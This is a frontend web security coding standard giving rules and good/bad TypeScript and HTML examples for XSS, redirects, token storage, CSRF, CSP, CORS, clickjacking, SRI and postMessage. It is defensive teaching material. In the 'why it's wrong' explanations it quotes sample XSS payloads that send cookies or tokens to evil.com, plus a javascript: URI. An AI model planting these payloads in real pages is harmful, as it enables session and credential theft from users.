---
id: web-frontend-security
title: Frontend Security
scope: web-frontend
severity: critical
tags: [security, xss, csp, cors, auth-tokens, frontend, owasp, cwe, clickjacking, sri, postmessage, dom-xss, cwe-1021, cwe-829, cwe-345]
references:
  - title: "OWASP — Cross-Site Scripting Prevention Cheat Sheet"
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
  - title: "CWE-79 — Cross-site Scripting (XSS)"
    url: https://cwe.mitre.org/data/definitions/79.html
  - title: "MDN — Content Security Policy (CSP)"
    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
  - title: "OWASP — CORS Cheat Sheet"
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html
  - title: "OWASP — CSRF Prevention Cheat Sheet"
    url: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
  - title: "CWE-352 — Cross-Site Request Forgery (CSRF)"
    url: https://cwe.mitre.org/data/definitions/352.html
  - title: "CWE-1021 — Improper Restriction of Rendered UI Layers (Clickjacking)"
    url: https://cwe.mitre.org/data/definitions/1021.html
  - title: "CWE-829 — Inclusion of Functionality from Untrusted Control Sphere"
    url: https://cwe.mitre.org/data/definitions/829.html
  - title: "CWE-345 — Insufficient Verification of Data Authenticity"
    url: https://cwe.mitre.org/data/definitions/345.html
  - title: "MDN — Subresource Integrity"
    url: https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
---

## Principle

The browser is hostile territory. Every value rendered into the DOM is a potential XSS vector. Every token stored client-side is a potential theft target. The frontend is a UX layer, not a security boundary — the server must enforce all security rules independently.

AI fails to generate XSS-safe code **86% of the time** (CWE-79/80). Auth token handling is frequently insecure — tokens in localStorage, no refresh flow, no expiry handling. This standard covers the client-side defenses that prevent the most common browser-side attacks.

## Rules

### XSS Prevention

1. **Never insert untrusted data into the DOM via raw HTML.** Do not use `innerHTML`, `outerHTML`, `document.write()`, `insertAdjacentHTML()`, or framework equivalents that bypass escaping (React's `dangerouslySetInnerHTML`, Vue's `v-html`, Angular's `bypassSecurityTrustHtml`). Use text content methods or framework default rendering, which auto-escapes. (CWE-79)

2. **Sanitize if raw HTML rendering is unavoidable.** When rendering user-generated rich text (markdown, WYSIWYG output), use a proven sanitizer library (DOMPurify) configured to allow only the specific tags and attributes needed. Never write a custom HTML sanitizer. (CWE-79)

3. **Encode dynamic values for their output context.** A value rendered in an HTML attribute needs HTML-attribute encoding. A value inserted into a URL needs URL encoding. A value embedded in JavaScript needs JavaScript encoding. The correct encoding depends on WHERE the value is placed, not what it contains. (CWE-116)

4. **Never construct URLs from user input without validation.** User-controlled values in `href`, `src`, `action`, or redirect targets can execute `javascript:` URIs or redirect to attacker-controlled sites. Apply all of the following:
   - **Scheme validation:** Parse the URL and check that the protocol is `http:` or `https:`. Block `javascript:`, `data:`, and `vbscript:` schemes.
   - **Relative path validation:** Require they start with `/` and do NOT start with `//` (protocol-relative URLs like `//evil.com` navigate to external sites).
   - **Redirect target restriction:** For redirect parameters (`next=`, `return_to=`, `redirect_uri=`), do NOT allow arbitrary external URLs even if they pass scheme validation. An attacker sets `next=https://phish.example/login` and the user is redirected to a convincing phishing page after login. Use one of:
     - **Path-only redirects (preferred):** Only accept relative paths (`/dashboard`, `/settings`). Reject any URL containing `://` or starting with `//`.
     - **Domain allowlist:** If external redirects are required, maintain an explicit list of trusted domains and reject all others.
   - Passing protocol and relative-path checks is not sufficient for redirect safety. (CWE-601)

### Auth Token Handling

5. **Store auth tokens in httpOnly cookies, not localStorage or sessionStorage.** Tokens in browser storage are accessible to any JavaScript running on the page — including XSS payloads. httpOnly cookies are not accessible to JavaScript, making them resistant to XSS-based token theft. (CWE-922)

6. **Pair cookie-based auth with layered CSRF protection.** httpOnly cookies are sent automatically by the browser — including from attacker-controlled sites (CSRF). `SameSite=Lax` alone has gaps: it permits cross-site top-level GET navigations, and state-changing GET endpoints (which should not exist but do) remain vulnerable. Required defenses for state-changing requests (POST, PUT, DELETE):
   - **Mandatory:** Set `SameSite=Lax` or `SameSite=Strict` on all auth cookies.
   - **Mandatory:** Include a CSRF token (synchronizer token or double-submit cookie) validated server-side on every state-changing request.
   - **Mandatory:** Never perform state changes on GET requests. GET must be idempotent.
   - **Recommended:** Verify `Origin` header server-side as an additional layer.
   - A single defense layer is insufficient. Both SameSite AND CSRF tokens are required. (CWE-352)

7. **Implement token refresh before expiry.** Access tokens should be short-lived (minutes, not hours). Refresh tokens extend sessions without requiring re-authentication. Implement silent refresh before the access token expires — not after the user gets a 401 error.

8. **Clear all auth state on logout.** On logout: invalidate the session server-side, clear httpOnly cookies (via server response), clear any in-memory auth state, and redirect to a public page. Do not rely on client-side token deletion alone — the server must also invalidate the session.

### Content Security Policy (CSP)

9. **Deploy a Content Security Policy that blocks inline scripts.** At minimum, set `script-src` to disallow `'unsafe-inline'` and `'unsafe-eval'`. Use nonce-based or hash-based CSP for inline scripts that are necessary. CSP is the strongest defense against XSS — even if an injection vulnerability exists, CSP prevents the injected script from executing. (CWE-79)

10. **Do not use `'unsafe-inline'` or `'unsafe-eval'` in production CSP.** These directives disable the primary protections CSP provides. If a library requires `eval()`, find an alternative or configure nonce-based exceptions. If inline styles are needed, use `style-src` with hashes rather than `'unsafe-inline'`.

### CORS

11. **Never set `Access-Control-Allow-Origin: *` on authenticated endpoints.** Wildcard CORS allows any website to make requests to your API. For endpoints that require authentication, set the allowed origins explicitly to your own domains. Wildcard is only appropriate for truly public, unauthenticated APIs. (CWE-346)

12. **Do not reflect the `Origin` header as the `Access-Control-Allow-Origin` value.** Reflecting the origin header from the request is equivalent to `*` but bypasses the browser's restriction on sending credentials with wildcard CORS. Maintain an explicit allowlist of trusted origins.

### Client-Side Validation

13. **Validate on the client for UX. Validate on the server for security.** Client-side validation provides instant feedback to users — it is not a security boundary. Every validation rule on the client must be duplicated on the server. An attacker can bypass the browser entirely and send any request they want to your API.

### Browser-Level Defenses

14. **Set `frame-ancestors` in CSP to prevent clickjacking.** Set `frame-ancestors 'none'` or `frame-ancestors 'self'` in your Content Security Policy to prevent your pages from being embedded in attacker-controlled iframes. Also set `X-Frame-Options: DENY` (or `SAMEORIGIN`) as a fallback for older browsers that do not support CSP `frame-ancestors`. Clickjacking overlays invisible iframes to trick users into clicking buttons on your site — the user thinks they are clicking on the attacker's page, but they are actually performing actions on yours. (CWE-1021)

15. **Never use DOM lookups for security-critical references where user HTML is rendered.** Do not rely on `document.getElementById()` or `document.forms` for security-critical element lookups when user-generated HTML exists on the page. Attackers can inject `<img id="csrf_token">` or `<form name="login">` elements that override your JavaScript references (DOM clobbering). Use unique prefixed IDs, namespace your security-critical elements, or use closures to capture references before user content is injected. (CWE-79)

16. **Require Subresource Integrity (SRI) for all CDN-loaded scripts and stylesheets.** Every `<script>` and `<link>` tag loading from a CDN or third-party domain must include an `integrity` attribute with a SHA-384 or SHA-512 hash and `crossorigin="anonymous"`. If the CDN is compromised, SRI prevents the tampered script from executing — the browser compares the downloaded file's hash against the declared hash and blocks execution on mismatch. (CWE-829)

17. **Sandbox third-party scripts.** Load analytics, ads, and third-party widgets in sandboxed iframes or use CSP to isolate their execution. Third-party scripts run with the same privileges as your own code — they can read cookies, access localStorage, and make requests as the user. Use `<iframe sandbox="allow-scripts">` or strict CSP `script-src` directives that separate first-party and third-party origins. (CWE-829)

18. **Validate `postMessage` origin and data before processing.** Always verify `event.origin` against an explicit allowlist before processing `postMessage` events. Always validate the structure and type of `event.data`. Never use `*` as the target origin when sending messages containing sensitive data. Without origin validation, any page (including attacker-controlled sites) can send messages to your window. (CWE-345)

19. **Never pass user input to DOM XSS sinks.** The following APIs execute or interpret strings as code or markup — never pass user-controlled values to them: `innerHTML`, `outerHTML`, `document.write()`, `document.writeln()`, `insertAdjacentHTML()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function(string)`, `location.href` assignment from user data, `location.assign()`, `location.replace()`. Use `textContent` for rendering text, `createElement`/`setAttribute` for DOM construction, and the Trusted Types API where available to enforce sink safety at the browser level. (CWE-79)

## Patterns

### XSS Prevention

#### Do This

```tsx
// React auto-escapes by default — use normal rendering
function UserComment({ comment }: { comment: string }) {
  return <p>{comment}</p>;  // Safely escaped — XSS-safe
}

// When raw HTML is genuinely needed, sanitize with DOMPurify
import DOMPurify from "dompurify";

function RichContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
    ALLOWED_ATTR: ["href"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

#### Not This

```tsx
// Rendering user input as raw HTML without sanitization (CWE-79)
function UserComment({ comment }: { comment: string }) {
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}
```

**Why it's wrong:** If `comment` contains `<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">`, the browser executes the attacker's JavaScript. The attacker steals cookies, session tokens, and can perform actions as the logged-in user. React's default rendering escapes HTML — `dangerouslySetInnerHTML` explicitly bypasses that protection.

### URL Validation

#### Do This

```typescript
// General link validation — safe for href/src attributes
function SafeLink({ url, children }: { url: string; children: React.ReactNode }) {
  const isAllowed =
    /^https?:\/\//.test(url) ||          // Absolute HTTP(S) URLs
    (url.startsWith("/") && !url.startsWith("//")); // Relative paths, NOT protocol-relative
  if (!isAllowed) {
    return <span>{children}</span>; // Not a link if URL is suspicious
  }
  return <a href={url}>{children}</a>;
}

// Redirect target validation — stricter, path-only by default
function safeRedirect(target: string, fallback = "/"): string {
  // Only allow relative paths — reject anything with :// or starting with //
  if (target.includes("://") || target.startsWith("//")) {
    return fallback;
  }
  if (!target.startsWith("/")) {
    return fallback;
  }
  return target;
}

// Usage: const next = safeRedirect(searchParams.get("next") ?? "/");
```

#### Not This

```typescript
// User-controlled href with no validation (CWE-79)
function UserLink({ url, label }: { url: string; label: string }) {
  return <a href={url}>{label}</a>;
}

// An attacker sets url to: javascript:alert(document.cookie)
```

**Why it's wrong:** `<a href="javascript:alert(document.cookie)">` executes JavaScript when clicked. Without URL scheme validation, any user-controlled `href` is an XSS vector. The same applies to `src`, `action`, and any attribute that loads or navigates to a URL.

### Token Storage

#### Do This

```typescript
// Server sets httpOnly cookie — JavaScript cannot read it
// POST /api/login → Response includes:
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

// Client sends credentials automatically with cookies
const response = await fetch("/api/orders", {
  credentials: "include", // Browser sends httpOnly cookie automatically
});
```

#### Not This

```typescript
// Storing token in localStorage — accessible to any XSS payload (CWE-922)
const token = await login(email, password);
localStorage.setItem("auth_token", token);

// Any XSS vulnerability can steal this token:
// fetch('https://evil.com/steal?token=' + localStorage.getItem('auth_token'))
```

**Why it's wrong:** `localStorage` is accessible to any JavaScript running on the page. A single XSS vulnerability — even in a third-party script — can read the token and send it to an attacker. httpOnly cookies are invisible to JavaScript, so even a successful XSS attack cannot steal the session token.

### Content Security Policy

#### Do This

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'nonce-abc123';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

#### Not This

```
Content-Security-Policy: default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';
```

**Why it's wrong:** `'unsafe-inline'` allows any inline `<script>` tag to execute — including those injected via XSS. `'unsafe-eval'` allows `eval()`, `Function()`, and `setTimeout("string")` — all XSS execution paths. `default-src *` allows loading resources from any origin. This CSP provides effectively zero protection.

### Browser-Level Defense Patterns

#### Clickjacking Prevention (R14)

##### Do This

```
Content-Security-Policy: frame-ancestors 'none';
X-Frame-Options: DENY
```

```typescript
// Express middleware — set both headers for full browser coverage
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "frame-ancestors 'none'");
  res.setHeader("X-Frame-Options", "DENY");
  next();
});
```

##### Not This

```
// No frame protection headers at all — attacker embeds your page in an invisible iframe
// and overlays a "Click here to win!" button on top of your "Transfer $1000" button
```

**Why it's wrong:** Without `frame-ancestors` or `X-Frame-Options`, any site can embed your page in an `<iframe>`. An attacker positions the iframe invisibly over a decoy page, tricking users into clicking your site's buttons (delete account, transfer funds, change settings) while they think they're interacting with the attacker's page.

#### Subresource Integrity (R16)

##### Do This

```html
<!-- SRI hash ensures CDN-served file hasn't been tampered with -->
<script
  src="https://cdn.example.com/lib@3.2.1/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"
></script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/styles@1.0.0/main.css"
  integrity="sha384-Tn2K3lGq02mJGbBv0Sb5r0qXhMXhGJqoHhf4M1U7k0TzDEj55R2J50MFn2oXFnp"
  crossorigin="anonymous"
/>
```

##### Not This

```html
<!-- No integrity check — if the CDN is compromised, your users run the attacker's code -->
<script src="https://cdn.example.com/lib.js"></script>
```

**Why it's wrong:** Without `integrity`, the browser trusts whatever the CDN serves. If the CDN is compromised or a supply chain attack replaces the file, every visitor to your site executes the attacker's JavaScript with full access to your page's cookies, DOM, and user data.

#### postMessage Validation (R18)

##### Do This

```typescript
const TRUSTED_ORIGINS = new Set([
  "https://trusted.example.com",
  "https://app.example.com",
]);

window.addEventListener("message", (event: MessageEvent) => {
  // Always check origin against an explicit allowlist
  if (!TRUSTED_ORIGINS.has(event.origin)) return;

  // Validate data structure before processing
  if (typeof event.data !== "object" || event.data === null) return;
  if (typeof event.data.action !== "string") return;

  processMessage(event.data);
});

// When sending, always specify the exact target origin
targetWindow.postMessage({ action: "update" }, "https://trusted.example.com");
```

##### Not This

```typescript
// No origin check — any page can send messages to your window (CWE-345)
window.addEventListener("message", (event) => {
  processData(event.data); // Attacker opens your page and sends crafted messages
});

// Using wildcard target — sensitive data sent to any origin
iframe.contentWindow.postMessage(sensitiveData, "*");
```

**Why it's wrong:** Without origin validation, any website that opens your page (via `window.open` or embedding) can send arbitrary `postMessage` events. The attacker crafts a malicious payload that your handler processes as if it came from a trusted source. Using `*` as the target origin means any page — including attacker-controlled ones — can receive your sensitive data.

#### DOM XSS Sink Prevention (R19)

##### Do This

```typescript
// Use textContent for user-provided text — it is never parsed as HTML
element.textContent = userInput;

// Use createElement + setAttribute for dynamic DOM construction
const link = document.createElement("a");
link.setAttribute("href", sanitizedUrl);
link.textContent = userProvidedLabel;
container.appendChild(link);

// Use Trusted Types API to enforce sink safety (where supported)
if (window.trustedTypes) {
  const policy = trustedTypes.createPolicy("default", {
    createHTML: (input: string) => DOMPurify.sanitize(input),
  });
}
```

##### Not This

```typescript
// Passing user input to DOM XSS sinks — all execute attacker code (CWE-79)
element["innerHTML"] = userInput;              // Classic DOM XSS
element["outerHTML"] = userInput;              // Replaces element with attacker HTML
setTimeout(userControlledString, 0);           // Compiles string as code
setInterval(userControlledString, 1000);       // Compiles string as code
document.write("<div>" + userInput + "</div>"); // Injects raw HTML into page
location.href = userSuppliedUrl;               // javascript: URI execution
```

**Why it's wrong:** Every one of these APIs interprets its input as executable code or raw markup. If `userInput` contains `<img src=x onerror="steal()">`, the `innerHTML` sink executes the attacker's JavaScript. `setTimeout("string")` and `new Function("string")` compile strings as code. `location.href = "javascript:..."` executes arbitrary JavaScript. These are the DOM XSS sinks — the endpoints where tainted data becomes code.

## Exceptions

- **Server-side rendered (SSR) applications** where the initial HTML is generated server-side still need CSP and XSS protections — SSR does not eliminate client-side XSS risk once the page hydrates.
- **Static sites with no user input** (documentation, marketing pages) have lower XSS risk, but CSP should still be deployed to prevent injection via third-party scripts.
- **OAuth/OIDC flows** may require tokens in memory temporarily during the callback. Clear them immediately after exchange and store the session server-side.

## Cross-References

- [Security](core-security) — Universal input validation and output encoding principles
- [Backend Security](web-backend-security) — Server-side enforcement that client security depends on
- [Frontend Structure](web-frontend-structure) — Where security checks belong in the component tree
